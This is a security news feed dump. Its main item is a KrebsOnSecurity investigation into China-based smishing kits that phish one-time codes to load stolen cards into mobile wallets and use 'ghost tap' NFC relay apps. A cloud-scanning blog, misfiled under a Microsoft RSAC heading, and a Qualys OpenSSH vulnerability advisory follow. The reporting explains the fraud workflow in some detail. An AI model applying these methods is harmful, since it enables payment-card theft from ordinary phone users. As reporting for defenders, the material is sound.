&lt;p&gt;If you own a mobile phone, the chances are excellent that at some point in the past two years it has received at least one phishing message that spoofs the &lt;strong&gt;U.S. Postal Service&lt;/strong&gt; to supposedly collect some outstanding delivery fee, or an SMS that pretends to be a local toll road operator warning of a delinquent toll fee.&lt;/p&gt;
&lt;p&gt;These messages are being sent through sophisticated phishing kits sold by several cybercriminals based in mainland China. And they are not traditional SMS phishing or &amp;#8220;&lt;strong&gt;smishing&lt;/strong&gt;&amp;#8221; messages, as they bypass the mobile networks entirely. Rather, the missives are sent through the &lt;strong&gt;Apple iMessage&lt;/strong&gt; service and through &lt;a href="https://en.wikipedia.org/wiki/Rich_Communication_Services" rel="noopener" target="_blank"&gt;RCS&lt;/a&gt;, the functionally equivalent technology on &lt;strong&gt;Google&lt;/strong&gt; phones.&lt;/p&gt;
&lt;p&gt;People who enter their payment card data at one of these sites will be told their financial institution needs to verify the small transaction by sending a one-time passcode to the customer&amp;#8217;s mobile device. In reality, that code will be sent by the victim&amp;#8217;s financial institution to verify that the user indeed wishes to link their card information to a mobile wallet.&lt;/p&gt;
&lt;p&gt;If the victim then provides that one-time code, the phishers will link the card data to a new mobile wallet from Apple or Google, loading the wallet onto a mobile phone that the scammers control.&lt;/p&gt;
&lt;h2&gt;CARDING REINVENTED&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Ford Merrill&lt;/strong&gt; works in security research at &lt;a href="https://www.secalliance.com/" rel="noopener" target="_blank"&gt;SecAlliance&lt;/a&gt;, a &lt;a href="https://www.csis.com/" rel="noopener" target="_blank"&gt;CSIS Security Group&lt;/a&gt; company. Merrill has been studying the evolution of several China-based smishing gangs, and found that most of them feature helpful and informative video tutorials in their sales accounts on Telegram. Those videos show the thieves are loading multiple stolen digital wallets on a single mobile device, and then selling those phones in bulk for hundreds of dollars apiece.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Who says carding is dead?,&amp;#8221; said Merrill, who presented about his findings at the &lt;a href="https://www.m3aawg.org/upcoming-meetings" rel="noopener" target="_blank"&gt;M3AAWG&lt;/a&gt; security conference in Lisbon earlier today. &amp;#8220;This is the best mag stripe cloning device ever. This threat actor is saying you need to buy at least 10 phones, and they&amp;#8217;ll air ship them to you.&amp;#8221;&lt;/p&gt;
&lt;p&gt;One promotional video shows stacks of milk crates stuffed full of phones for sale. A closer inspection reveals that each phone is affixed with a handwritten notation that typically references the date its mobile wallets were added, the number of wallets on the device, and the initials of the seller.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70436" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70436" height="567" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/phishingphones.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70436"&gt;An image from the Telegram channel for a popular Chinese smishing kit vendor shows 10 mobile phones for sale, each loaded with 4-6 digital wallets from different UK financial institutions.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Merrill said one common way criminal groups in China are cashing out with these stolen mobile wallets involves setting up fake e-commerce businesses on &lt;strong&gt;Stripe&lt;/strong&gt; or &lt;strong&gt;Zelle&lt;/strong&gt; and running transactions through those entities &amp;#8212; often for amounts totaling between $100 and $500.&lt;/p&gt;
&lt;p&gt;Merrill said that when these phishing groups first began operating in earnest two years ago, they would wait between 60 to 90 days before selling the phones or using them for fraud. But these days that waiting period is more like just seven to ten days, he said.&lt;/p&gt;
&lt;p&gt;&amp;#8220;When they first installed this, the actors were very patient,&amp;#8221; he said. &amp;#8220;Nowadays, they only wait like 10 days before [the wallets] are hit hard and fast.&amp;#8221;&lt;span id="more-70276"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;GHOST TAP&lt;/h2&gt;
&lt;p&gt;Criminals also can cash out mobile wallets by obtaining real point-of-sale terminals and using tap-to-pay on phone after phone. But they also offer a more cutting-edge mobile fraud technology: Merrill found that at least one of the Chinese phishing groups sells an Android app called &amp;#8220;&lt;strong&gt;ZNFC&lt;/strong&gt;&amp;#8221; that can relay a valid NFC transaction to anywhere in the world. The user simply waves their phone at a local payment terminal that accepts Apple or Google pay, and the app relays an NFC transaction over the Internet from a phone in China.&lt;/p&gt;
&lt;div style="text-align: center;"&gt;&lt;/div&gt;
&lt;p&gt;&amp;#8220;The software can work from anywhere in the world,&amp;#8221; Merrill said. &amp;#8220;These guys provide the software for $500 a month, and it can relay both NFC enabled tap-to-pay as well as any digital wallet. The even have 24-hour support.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The rise of so-called &amp;#8220;ghost tap&amp;#8221; mobile software was &lt;a href="https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay" rel="noopener" target="_blank"&gt;first documented in November 2024&lt;/a&gt; by security experts at &lt;strong&gt;ThreatFabric&lt;/strong&gt;. &lt;strong&gt;Andy Chandler&lt;/strong&gt;, the company&amp;#8217;s chief commercial officer, said their researchers have since identified a number of criminal groups from different regions of the world latching on to this scheme.&lt;/p&gt;
&lt;p&gt;Chandler said those include organized crime gangs in Europe that are using similar mobile wallet and NFC attacks to take money out of ATMs made to work with smartphones.&lt;/p&gt;
&lt;p&gt;&amp;#8220;No one is talking about it, but we&amp;#8217;re now seeing ten different methodologies using the same modus operandi, and none of them are doing it the same,&amp;#8221; Chandler said. &amp;#8220;This is much bigger than the banks are prepared to say.&amp;#8221;&lt;/p&gt;
&lt;p&gt;A November 2024 story in the Singapore daily &lt;em&gt;The Straits Times&lt;/em&gt; &lt;a href="https://www.straitstimes.com/singapore/scam-syndicates-sending-foreigners-into-singapore-to-cheat-retailers-like-apple-store-and-best-denki" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; authorities there arrested three foreign men who were recruited in their home countries via social messaging platforms, and given ghost tap apps with which to purchase expensive items from retailers, including mobile phones, jewelry, and gold bars.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Since Nov 4, at least 10 victims who had fallen for e-commerce scams have reported unauthorised transactions totaling more than $100,000 on their credit cards for purchases such as electronic products, like iPhones and chargers, and jewelry in Singapore,&amp;#8221; &lt;em&gt;The Straits Times&lt;/em&gt; wrote, noting that in another case with a similar modus operandi, the police arrested a Malaysian man and woman on Nov 8.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70459" style="width: 863px;"&gt;&lt;img alt="" class="size-full wp-image-70459" height="567" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/thestraitstimes.png" width="853" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70459"&gt;Three individuals charged with using ghost tap software at an electronics store in Singapore. Image: The Straits Times.&lt;/p&gt;&lt;/div&gt;
&lt;h2&gt;ADVANCED PHISHING TECHNIQUES&lt;/h2&gt;
&lt;p&gt;According to Merrill, the phishing pages that spoof the USPS and various toll road operators are powered by several innovations designed to maximize the extraction of victim data.&lt;/p&gt;
&lt;p&gt;For example, a would-be smishing victim might enter their personal and financial information, but then decide the whole thing is scam before actually submitting the data. In this case, anything typed into the data fields of the phishing page will be captured in real time, regardless of whether the visitor actually clicks the &amp;#8220;submit&amp;#8221; button.&lt;/p&gt;
&lt;p&gt;Merrill said people who submit payment card data to these phishing sites often are then told their card can&amp;#8217;t be processed, and urged to use a different card. This technique, he said, sometimes allows the phishers to steal more than one mobile wallet per victim.&lt;/p&gt;
&lt;p&gt;Many phishing websites expose victim data by storing the stolen information directly on the phishing domain. But Merrill said these Chinese phishing kits will forward all victim data to a back-end database operated by the phishing kit vendors. That way, even when the smishing sites get taken down for fraud, the stolen data is still safe and secure.&lt;/p&gt;
&lt;p&gt;Another important innovation is the use of mass-created Apple and Google user accounts through which these phishers send their spam messages. One of the Chinese phishing groups posted images on their Telegram sales channels showing how these robot Apple and Google accounts are loaded onto Apple and Google phones, and arranged snugly next to each other in an expansive, multi-tiered rack that sits directly in front of the phishing service operator.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70435" style="width: 528px;"&gt;&lt;img alt="" class="size-full wp-image-70435" height="688" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/phonesashtray.png" width="518" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70435"&gt;The ashtray says: You&amp;#8217;ve been phishing all night.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In other words, the smishing websites are powered by real human operators as long as new messages are being sent. Merrill said the criminals appear to send only a few dozen messages at a time, likely because completing the scam takes manual work by the human operators in China. After all, most one-time codes used for mobile wallet provisioning are generally only good for a few minutes before they expire.&lt;/p&gt;
&lt;p&gt;Notably, none of the phishing sites spoofing the toll operators or postal services will load in a regular Web browser; they will only render if they detect that a visitor is coming from a mobile device.&lt;/p&gt;
&lt;p&gt;&amp;#8220;One of the reasons they want you to be on a mobile device is they want you to be on the same device that is going to receive the one-time code,&amp;#8221; Merrill said. &amp;#8220;They also want to minimize the chances you will leave. And if they want to get that mobile tokenization and grab your one-time code, they need a live operator.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Merrill found the Chinese phishing kits feature another innovation that makes it simple for customers to turn stolen card details into a mobile wallet: They programmatically take the card data supplied by the phishing victim and convert it into a digital image of a real payment card that matches that victim&amp;#8217;s financial institution. That way, attempting to enroll a stolen card into Apple Pay, for example, becomes as easy as scanning the fabricated card image with an iPhone.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70439" style="width: 407px;"&gt;&lt;img alt="" class="size-full wp-image-70439" height="488" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/phish-cabelas.png" width="397" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70439"&gt;An ad from a Chinese SMS phishing group&amp;#8217;s Telegram channel showing how the service converts stolen card data into an image of the stolen card.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&amp;#8220;The phone isn&amp;#8217;t smart enough to know whether it&amp;#8217;s a real card or just an image,&amp;#8221; Merrill said. &amp;#8220;So it scans the card into Apple Pay, which says okay we need to verify that you&amp;#8217;re the owner of the card by sending a one-time code.&amp;#8221;&lt;/p&gt;
&lt;h2&gt;PROFITS&lt;/h2&gt;
&lt;p&gt;How profitable are these mobile phishing kits? The best guess so far comes from data gathered by other security researchers who&amp;#8217;ve been tracking these advanced Chinese phishing vendors.&lt;/p&gt;
&lt;p&gt;In August 2023, the security firm Resecurity &lt;a href="https://www.resecurity.com/blog/article/smishing-triad-targeted-usps-and-us-citizens-for-data-theft" rel="noopener" target="_blank"&gt;discovered a vulnerability&lt;/a&gt; in one popular Chinese phish kit vendor&amp;#8217;s platform that exposed the personal and financial data of phishing victims. Resecurity dubbed the group the &lt;strong&gt;Smishing Triad&lt;/strong&gt;, and found the gang had harvested 108,044 payment cards across 31 phishing domains (3,485 cards per domain).&lt;/p&gt;
&lt;p&gt;In August 2024, security researcher &lt;strong&gt;Grant Smith&lt;/strong&gt; gave &lt;a href="https://www.youtube.com/watch?v=gLOv67LlIQs&amp;amp;list=PL9fPq3eQfaaB2scbXRczwvjVH0ckX4bwt&amp;amp;index=14" rel="noopener" target="_blank"&gt;a presentation&lt;/a&gt; at the DEFCON security conference about tracking down the Smishing Triad after scammers spoofing the U.S. Postal Service &lt;a href="https://www.wired.com/story/usps-scam-text-smishing-triad/" rel="noopener" target="_blank"&gt;duped his wife&lt;/a&gt;. By identifying a different vulnerability in the gang&amp;#8217;s phishing kit, Smith said he was able to see that people entered 438,669 unique credit cards in 1,133 phishing domains (387 cards per domain).&lt;/p&gt;
&lt;p&gt;Based on his research, Merrill said it&amp;#8217;s reasonable to expect between $100 and $500 in losses on each card that is turned into a mobile wallet. Merrill said they observed nearly 33,000 unique domains tied to these Chinese smishing groups during the year between the publication of Resecurity&amp;#8217;s research and Smith&amp;#8217;s DEFCON talk.&lt;/p&gt;
&lt;p&gt;Using a median number of 1,935 cards per domain and a conservative loss of $250 per card, that comes out to about $15 billion in fraudulent charges over a year.&lt;/p&gt;
&lt;p&gt;Merrill was reluctant to say whether he&amp;#8217;d identified additional security vulnerabilities in any of the phishing kits sold by the Chinese groups, noting that the phishers quickly fixed the vulnerabilities that were detailed publicly by Resecurity and Smith.&lt;/p&gt;
&lt;h2&gt;FIGHTING BACK&lt;/h2&gt;
&lt;p&gt;Adoption of touchless payments took off in the United States after the Coronavirus pandemic emerged, and many financial institutions in the United States were eager to make it simple for customers to link payment cards to mobile wallets. Thus, the authentication requirement for doing so defaulted to sending the customer a one-time code via SMS.&lt;/p&gt;
&lt;p&gt;Experts say the continued reliance on one-time codes for onboarding mobile wallets has fostered this new wave of carding. KrebsOnSecurity interviewed a security executive from a large European financial institution who spoke on condition of anonymity because they were not authorized to speak to the press.&lt;/p&gt;
&lt;p&gt;That expert said the lag between the phishing of victim card data and its eventual use for fraud has left many financial institutions struggling to correlate the causes of their losses.&lt;/p&gt;
&lt;p&gt;&amp;#8220;That&amp;#8217;s part of why the industry as a whole has been caught by surprise,&amp;#8221; the expert said. &amp;#8220;A lot of people are asking, how this is possible now that we&amp;#8217;ve tokenized a plaintext process. We&amp;#8217;ve never seen the volume of sending and people responding that we&amp;#8217;re seeing with these phishers.&amp;#8221;&lt;/p&gt;
&lt;p&gt;To improve the security of digital wallet provisioning, some banks in Europe and Asia require customers to log in to the bank&amp;#8217;s mobile app before they can link a digital wallet to their device.&lt;/p&gt;
&lt;p&gt;Addressing the ghost tap threat may require updates to contactless payment terminals, to better identify NFC transactions that are being relayed from another device. But experts say it&amp;#8217;s unrealistic to expect retailers will be eager to replace existing payment terminals before their expected lifespans expire.&lt;/p&gt;
&lt;p&gt;And of course Apple and Google have an increased role to play as well, given that their accounts are being created en masse and used to blast out these smishing messages. Both companies could easily tell which of their devices suddenly have 7-10 different mobile wallets added from 7-10 different people around the world. They could also recommend that financial institutions use more secure authentication methods for mobile wallet provisioning.&lt;/p&gt;
&lt;p&gt;Neither Apple nor Google responded to requests for comment on this story.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70276</guid><category>A Little Sunshine</category><category>All About Skimmers</category><category>The Coming Storm</category><category>Web Fraud 2.0</category><category>Andy Chandler</category><category>apple</category><category>CSIS Security Group</category><category>Ford Merrill</category><category>ghost tap</category><category>google</category><category>Grant Smith</category><category>iMessage</category><category>M3AAWG</category><category>RCS</category><category>Resecurity</category><category>SecAlliance</category><category>smishing</category><category>ThreatFabric</category><category>ZNFC</category></item><item><title>​​Join us for the end-to-end Microsoft RSAC 2025 Conference experience</title><link>https://www.microsoft.com/en-us/security/blog/2025/02/18/join-us-for-the-end-to-end-microsoft-rsac-2025-conference-experience/</link><description>&lt;p&gt;Join Microsoft at RSAC 2025, where we will showcase end-to-end security designed to help organizations accelerate the secure adoption of AI.&lt;/p&gt;

Vulnerability scanning remains a cornerstone of cloud security, enabling organizations to identify and address risks effectively. However, with the increasing prevalence of exploited vulnerabilities, persistent cloud misconfigurations, and exposure to identity leaks, &lt;strong&gt;traditional approaches to vulnerability scanning are no longer sufficient.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;This blog delves into key focus areas to ensure a robust cloud security posture.&lt;/p&gt;



&lt;span id="more-37178"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="exploited-vulnerabilities-are-increasing-and-one-method-of-scanning-is-not-enough"&gt;Exploited Vulnerabilities Are Increasing, and One Method of Scanning Is Not Enough&lt;/h2&gt;



&lt;p&gt;In 2024, the frequency and impact of exploited vulnerabilities reached unprecedented levels. According to &lt;a href="https://www.verizon.com/business/resources/reports/dbir/"&gt;Verizon’s 2024 Data Breach Investigations Report (DBIR)&lt;/a&gt;, over 32% of breaches were attributed to vulnerability exploitation, underscoring the need for proactive scanning strategies. Attackers leverage unpatched systems, zero-day vulnerabilities, and configuration gaps to compromise cloud environments.&lt;/p&gt;



&lt;p&gt;A notable example involved &lt;a href="https://www.darkreading.com/endpoint-security/cybercrime-gangs-steal-thousands-aws-credentials"&gt;cybercriminal gangs exploiting vulnerabilities in public websites to steal Amazon Web Services (AWS) credentials&lt;/a&gt; and other sensitive data from thousands of accounts. This incident highlights the importance of securing cloud environments against unauthorized access and ensuring regular credential audits to prevent such breaches.&lt;/p&gt;



&lt;p&gt;Additionally, &lt;a href="https://www.wired.com/story/aws-application-load-balancer-implementation-compromise/"&gt;a study revealed a vulnerability&lt;/a&gt; in Amazon Web Services (AWS) Application Load Balancer (ALB) that could allow attackers to bypass access controls and access web applications. The issue, tied to user implementation rather than a software bug, demonstrated how attackers could manipulate ALB authentication handoff to a third-party service, accessing sensitive application data. These cases underscore the critical need for thorough scanning of authentication configurations and regular security reviews.&lt;/p&gt;



&lt;p&gt;To address this evolving threat landscape, organizations must adopt a hybrid scanning approach:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Agent-Based Scanning:&lt;/strong&gt; Continuous monitoring of live workloads offers granular, real-time insights into vulnerabilities, including runtime misconfigurations and zero-day threats. By operating directly within workloads, agents provide unmatched depth in vulnerability detection.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Agentless Scanning:&lt;/strong&gt; Broad, non-intrusive scans excel at identifying infrastructure misconfigurations and exposure risks across storage, networking, and IAM policies. These scans are particularly effective for environments where agent deployment is challenging, such as &lt;br /&gt;ephemeral workloads that are alive for a short period of time.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Why Both Are Necessary:&lt;/strong&gt; A single method cannot fully address the complexities of modern cloud infrastructures. Organizations achieve comprehensive coverage by integrating agent-based and agentless scanning, balancing performance with thorough detection. This way, you ensure you scan and secure most of your cloud workloads, including ephemeral or long-running.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Pro Tips:&lt;/strong&gt; Automate scan schedules, prioritize findings based on exploitability, and integrate results into incident response workflows. Conduct regular workshops to train teams on interpreting scan results and implementing rapid remediation.&lt;/p&gt;



&lt;p&gt;You should start with agentless scans based on cloud events, as you do not know if any cloud workload, when deployed, is available for a short or long duration. Once you get first-time visibility and assessments done, you extend those workloads to agent-based scanning to ensure you get comprehensive scans.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="actionable-steps-to-detect-vulnerabilities"&gt;&lt;strong&gt;Actionable Steps to Detect Vulnerabilities&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Call to Action:&lt;/strong&gt; Ensure your security strategy includes agent-based and agentless scanning to cover diverse vulnerabilities comprehensively. For security teams, establish the following actionable steps:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Conduct a Capability Assessment:&lt;/strong&gt; Evaluate the performance of scanning tools and techniques against live and infrastructure-based vulnerabilities to identify current gaps.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Set Up Regular Training:&lt;/strong&gt; Educate your teams on interpreting scan results and applying prioritized remediations effectively.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Automate Workflows:&lt;/strong&gt; Integrate scanning results into incident response systems to enable rapid containment and resolution.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Perform Baseline Reviews:&lt;/strong&gt; Schedule quarterly reviews to reassess cloud environments for new risks and refine the scanning strategy based on threat trends.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Security teams can maintain a proactive stance against evolving vulnerabilities by operationalizing these steps while optimizing cloud performance.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="critical-misconfigurations-in-the-cloud-the-persistent-challenge"&gt;Critical Misconfigurations in the Cloud: The Persistent Challenge&lt;/h2&gt;



&lt;p&gt;Cloud misconfigurations remain a leading cause of breaches, accounting for over 18% of incidents in 2024, as &lt;a href="https://www.verizon.com/business/resources/reports/dbir/"&gt;reported by the DBIR&lt;/a&gt;. Errors such as open storage buckets, overly permissive IAM roles, and weak firewall rules expose critical data and resources to attackers.&lt;/p&gt;



&lt;p&gt;To combat this, organizations must implement proactive measures that detect and prevent misconfigurations early in the development lifecycle. Key strategies include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Continuous Monitoring for Configuration Drift:&lt;/strong&gt; Dynamic cloud environments experience frequent changes that can inadvertently introduce vulnerabilities. Automated tools can detect and alert teams to deviations from secure baselines, ensuring consistent security practices.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Shift-Left Security with Infrastructure as Code (IaC):&lt;/strong&gt; IaC templates ensure that configurations align with security standards from the outset, reducing human error and simplifying compliance.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Real-Time Alerts and Automation:&lt;/strong&gt; High-risk changes, such as modifying IAM policies or disabling encryption, should trigger immediate alerts and automated remediation workflows to minimize exposure.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Key Focus Areas:&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Storage Buckets (e.g., S3):&lt;/strong&gt; Regularly verify encryption settings, public access configurations, and lifecycle policies to mitigate risks associated with data exposure.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Metadata Services:&lt;/strong&gt; Deprecated configurations, such as AWS’s IMDSv1, should be identified and replaced with secure alternatives, such as IMDSv2.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Encryption:&lt;/strong&gt; Ensure data is encrypted in transit and at rest, with keys managed securely to prevent unauthorized access.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Pro Tips:&lt;/strong&gt; Leverage IaC scanning tools to catch misconfigurations before deployment. Establish policies for mandatory encryption and least-privilege access. Regularly audit logs to detect anomalous changes to critical resources.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="actionable-steps-to-find-misconfigurations"&gt;&lt;strong&gt;Actionable Steps to Find Misconfigurations&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Call to Action:&lt;/strong&gt; Strengthen your cloud configuration management with the following actionable steps:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Integrate Automated Configuration Scans:&lt;/strong&gt; Deploy tools that enforce secure baselines by scanning configurations in real time. Ensure these scans are integrated into CI/CD pipelines for early detection.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Establish Governance Policies:&lt;/strong&gt; Implement policies for mandatory encryption, access control, and logging practices to standardize security configurations.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Perform Regular Configuration Audits:&lt;/strong&gt; Schedule quarterly audits of cloud environments to identify and remediate vulnerabilities arising from configuration drift or oversights.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Simulate Configuration-Driven Incidents:&lt;/strong&gt; Conduct drills to test the team’s ability to detect and respond to misconfiguration-induced breaches. Use these learnings to refine monitoring tools and response protocols.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;By operationalizing these measures, security teams can avoid misconfigurations and reduce the attack surface across cloud infrastructures.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="exposure-is-increasing-due-to-identity-leakages-and-unwanted-entitlements"&gt;Exposure Is Increasing Due to Identity Leakages and Unwanted Entitlements&lt;/h2&gt;



&lt;p&gt;Identity-related vulnerabilities—such as leaked credentials and excessive permissions—are among the most exploited attack vectors. In 2024, &lt;a href="https://www.verizon.com/business/resources/reports/dbir/"&gt;62% of breaches analyzed in the DBIR&lt;/a&gt; involved compromised credentials, often due to misconfigured IAM policies, excessive entitlements, or leaked keys.&lt;/p&gt;



&lt;p&gt;Attackers exploit these gaps to move laterally within cloud environments, accessing sensitive data and escalating privileges. Addressing these risks requires a proactive and continuous approach:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Entitlement Reviews:&lt;/strong&gt; Conduct regular audits of IAM policies, roles, and permissions to ensure adherence to the principle of least privilege (PoLP). Revoke unused access keys and eliminate overly permissive roles.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Detecting Lateral Movement Risks:&lt;/strong&gt; Identify and mitigate configurations that allow attackers to navigate across systems, such as overly broad IAM policies or unmonitored access credentials.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Proactive Monitoring for Identity Exposures:&lt;/strong&gt; Use advanced scanning tools to detect publicly exposed credentials, weak passwords, and other identity-related vulnerabilities.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Indicators of Compromise (IOCs):&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Suspicious traffic patterns indicate potential credential abuse.&lt;/li&gt;



&lt;li&gt;Public-facing resources with unencrypted sensitive data.&lt;/li&gt;



&lt;li&gt;Unused or abandoned subdomains that could be targeted for takeover.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Pro Tips:&lt;/strong&gt; Implement conditional access policies and enforce multi-factor authentication (MFA) for all privileged accounts. Use role-based access control (RBAC) to limit permissions and monitor logs for unusual access patterns regularly.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="actionable-steps-to-find-and-close-identity-related-vulnerabilities"&gt;&lt;strong&gt;Actionable Steps to Find and Close Identity-Related Vulnerabilities&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Call to Action:&lt;/strong&gt; Take the following steps to address the risk of identity leakages and unwanted entitlements:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Strengthen&lt;/strong&gt; your identity and access management strategy. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Schedule&lt;/strong&gt; regular entitlement reviews and leverage tools that provide real-time visibility into IAM configurations. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Educate&lt;/strong&gt; your teams on best practices for credential security and conduct regular penetration tests to uncover identity-related vulnerabilities.&lt;/li&gt;
&lt;/ol&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;The modern cloud infrastructure landscape demands more than traditional security approaches. The attack surface has expanded exponentially with organizations leveraging multiple cloud services, containerized workloads, serverless functions, and microservices architectures. Our security strategies must evolve accordingly.&lt;/p&gt;



&lt;p&gt;Begin by auditing your cloud infrastructure&amp;#8217;s current security posture. Implement automated scanning across your cloud services, storage configurations, and identity frameworks. Integrate security checks into your infrastructure-as-code practices and establish clear metrics for measuring your security improvements. The cloud offers unprecedented scalability and flexibility &amp;#8211; ensure your security measures are equally dynamic and robust to protect these powerful capabilities.&lt;/p&gt;

The first, tracked as CVE-2025-26465, allows an active machine-in-the-middle attack on the OpenSSH client when the VerifyHostKeyDNS option is enabled. The second, CVE-2025-26466, affects both the OpenSSH client and server, enabling a pre-authentication denial-of-service attack. The attack against the OpenSSH client (CVE-2025-26465) succeeds [&amp;#8230;]</description><content:encoded>&lt;p&gt;The &lt;a href="https://www.qualys.com/tru/"&gt;Qualys Threat Research Unit (TRU)&lt;/a&gt; has identified two vulnerabilities in OpenSSH. The first, tracked as CVE-2025-26465, allows an active machine-in-the-middle attack on the OpenSSH client when the VerifyHostKeyDNS option is enabled. The second, CVE-2025-26466, affects both the OpenSSH client and server, enabling a pre-authentication denial-of-service attack.&lt;/p&gt;



&lt;p&gt;The attack against the OpenSSH client (CVE-2025-26465) succeeds regardless of whether the VerifyHostKeyDNS option is set to “yes” or “ask” (its default is “no”), requires no user interaction, and does not depend on the existence of an SSHFP resource record (an SSH fingerprint) in DNS. VerifyHostKeyDNS is an OpenSSH client configuration option that lets the SSH client look up and verify a server’s host key using DNS records (specifically, SSHFP records). The vulnerability was introduced in December 2014, just before the release of OpenSSH 6.8p1. Although VerifyHostKeyDNS is disabled by default, it was enabled by default on FreeBSD from September 2013 until March 2023.&lt;/p&gt;



&lt;p&gt;The OpenSSH client and server are vulnerable (CVE-2025-26466) to a pre-authentication denial-of-service attack–an asymmetric resource consumption of both memory and CPU–that was introduced in August 2023 (shortly before the release of OpenSSH 9.5p1). On the server side, this attack can be mitigated by leveraging existing mechanisms in OpenSSH, such as LoginGraceTime, MaxStartups, and the more recent PerSourcePenalties.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Recommended Action:&lt;/strong&gt; OpenSSH 9.9p2 addresses these vulnerabilities mentioned above. To ensure continued security, we strongly advise upgrading affected systems to 9.9p2 as soon as possible.&lt;/p&gt;



&lt;span id="more-37293"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="about-openssh-securing-enterprise-communications-and-infrastructure"&gt;&lt;strong&gt;About OpenSSH: Securing Enterprise Communications and Infrastructure&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;OpenSSH is a free, open-source implementation of the Secure Shell (SSH) protocol that enables encrypted communications over insecure networks. Widely adopted across Unix-like systems (including Linux and macOS) and many modern operating systems, it replaces clear-text protocols such as Telnet and FTP by providing secure remote login, file transfers, port forwarding, and tunneling.&lt;/p&gt;



&lt;p&gt;With robust encryption, privilege separation, sandboxing, and modern memory allocators, OpenSSH minimizes the risk of memory-related vulnerabilities and unauthorized access. Its enterprise-grade scalability supports automated processes, data backups, and complex DevOps workflows—all while enforcing strong access controls. Despite these two vulnerabilities, OpenSSH’s overall track record in maintaining confidentiality and integrity has made it a benchmark in software security, ensuring secure communications for organizations worldwide.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="affected-openssh-versions"&gt;&lt;strong&gt;Affected OpenSSH versions:&lt;/strong&gt;&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;OpenSSH versions from 6.8p1 through 9.9p1 are vulnerable to CVE-2025-26465, the flaw introduced in December 2014.&lt;/li&gt;



&lt;li&gt;OpenSSH versions 9.5p1 through 9.9p1 are vulnerable to CVE-2025-26466, the flaw introduced in August 2023.&lt;/li&gt;
&lt;/ul&gt;



